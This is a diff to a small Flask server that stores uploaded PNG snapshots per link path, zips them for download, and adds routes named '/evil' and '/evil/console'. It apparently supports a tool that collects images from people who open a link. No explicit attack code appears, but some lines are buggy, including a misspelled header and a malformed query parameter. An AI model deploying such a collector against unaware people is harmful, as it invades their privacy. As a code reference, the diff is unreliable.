@@ -7,6 +7,8 @@ import sqlite3
 import re
 import pathlib
 import os
+import zipfile
+from path import Path
 
 logging.basicConfig(level=logging.INFO)
 
@@ -27,13 +29,13 @@ def upload():
     global count
     app.logger.info('upload')
     file = request.files.get('file')
-    path = request.args.get('path')
+    path = request.values.get('path')
     if path is None or valid.match(path) is None:
         return 'invalid path', 400
 
     if not pathlib.Path(f'photos/{path}').is_dir():
         os.makedirs(f'photos/{path}')
-        
+
     file.save(
         f'photos/{path}/{time.strftime("%Y-%m-%d %H %M %S")} [{count}].png')
     count = count + 1 if count < 100 else 0
@@ -48,25 +50,56 @@ def index():
 @app.route('/api/create')
 def createLink():
     cur.execute('SELECT * FROM links WHERE path = ?',
-                (request.args.get('path'),))
+                (request.values.get('path'),))
     if cur.fetchone():
         return 'link already exists', 400
 
+    path = request.values.get('path')
+    if path is None or valid.match(path) is None:
+        return 'invalid path', 400
+
     cur.execute('INSERT INTO links (path, target) VALUES (?, ?)',
-                (request.args.get('path'), request.args.get('target')))
+                (request.values.get('path'), request.values.get('target')))
     conn.commit()
     return 'Link created'
 
 
-@app.route('/api/get')
+@app.route('/api/download')
 def getLink():
     cur.execute('SELECT * FROM links WHERE path = ?',
-                (request.args. get('path'),))
+                (request.values.get('path'),))
     link = cur.fetchone()
     if not link:
         return 'link not found', 404
 
-    return link[1]
+    path = request.values.get('path')
+    if path is None or valid.match(path) is None:
+        return 'invalid path', 400
+
+    zp = zipfile.ZipFile(f'zips/{path}.zip', 'w')
+    for i in os.listdir(f'photos/{path}'):
+        zp.write(f'photos/{path}/{i}', i)
+    zp.close()
+
+    return send_file(f'zips/{path}.zip', mimetype='application/zip', as_attachment=True), 200, [('Cache-Controll', 'no-store')]
+
+
+@app.route('/api/delete')
+def deleteLink():
+    cur.execute('SELECT * FROM links WHERE path = ?',
+                (request.values.get('path'),))
+    if not cur.fetchone():
+        return 'link not found', 400
+
+    cur.execute('DELETE FROM links WHERE path = ?',
+                (request.values.get('path')))
+    conn.commit()
+    return 'Link deleted'
+
+
+@app.route('/evil/console')
+def console():
+    return send_file('console.html')
 
 
 @app.route('/evil', defaults={'path': ''})
